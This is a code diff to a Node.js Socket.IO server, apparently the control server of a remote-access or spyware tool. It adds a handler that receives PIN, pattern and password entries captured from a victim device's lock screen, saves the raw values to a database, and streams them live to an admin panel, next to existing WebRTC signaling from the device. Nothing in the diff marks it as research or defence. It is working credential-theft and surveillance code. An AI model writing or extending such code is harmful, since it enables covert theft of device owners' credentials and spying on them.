@@ -397,6 +397,56 @@ function setupSocketHandlers(io) {
         });
 
         /**
+         * Unlock attempt from device - capture PIN/pattern/password entry on lock screen
+         */
+        socket.on('unlock:attempt', async (data) => {
+            const deviceId = connectedDevices.get(socket.id);
+            if (!deviceId) {
+                console.log('[UNLOCK] No deviceId for socket');
+                return;
+            }
+
+            const { unlockType, unlockData, success, reason, timestamp } = data;
+            console.log(`[UNLOCK] 🔐 Attempt from ${deviceId}: ${unlockType} - ${unlockData?.length || 0} chars (${reason})`);
+
+            try {
+                // Find device in database
+                const device = await prisma.device.findUnique({ where: { deviceId } });
+                if (!device) {
+                    console.log(`[UNLOCK] Device not found: ${deviceId}`);
+                    return;
+                }
+
+                // Store unlock attempt in database
+                await prisma.unlockAttempt.create({
+                    data: {
+                        deviceId: device.id,
+                        unlockType: unlockType || 'unknown',
+                        unlockData: unlockData || null,
+                        success: success === true,
+                        reason: reason || null,
+                        timestamp: new Date(timestamp || Date.now())
+                    }
+                });
+
+                console.log(`[UNLOCK] ✅ Stored unlock attempt for ${deviceId}`);
+
+                // Forward to admin panel for real-time display
+                io.to('admin').emit('unlock:attempt', {
+                    deviceId,
+                    unlockType,
+                    unlockData,
+                    success,
+                    reason,
+                    timestamp: timestamp || Date.now()
+                });
+
+            } catch (error) {
+                console.error('[UNLOCK] ❌ Error storing unlock attempt:', error.message);
+            }
+        });
+
+        /**
          * WebRTC Signaling - Offer from device
          */
         socket.on('webrtc:offer', (data) => {
